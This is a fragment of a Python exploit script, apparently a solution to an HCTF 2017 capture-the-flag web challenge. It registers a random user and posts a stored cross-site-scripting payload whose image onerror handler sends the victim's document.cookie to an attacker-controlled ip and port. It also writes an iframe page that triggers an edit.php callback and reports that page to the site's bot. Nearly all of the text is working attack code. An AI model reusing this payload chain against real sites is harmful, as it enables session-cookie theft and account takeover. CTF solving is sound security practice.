...
URL = 'http://hctf2017.local.virzz.com/'
# URL = 'http://127.0.0.1:8305/'
...
def randstr(n=6):
    return ''.join([random.choice("qwertyuiopasdfghjklzxcvbnm") for i in range(n)])
...
def exp():
    ...
    if register(name):
        if login(name):
            if message("<img src=x onerror=\"window.location.href='//%s:%d/?c='+escape(document.cookie)\" >" % (ip, port)):
                with open('some.html', 'w') as f:
                    f.write(
                        '<iframe src="//127.0.0.1/user.php"></iframe><script>window.frames[0].open("//127.0.0.1/edit.php?callback=RandomProfile&user=%s");</script>' % name)
                if report(name, 'http://%s:%d/some.html' % (ip, port)):
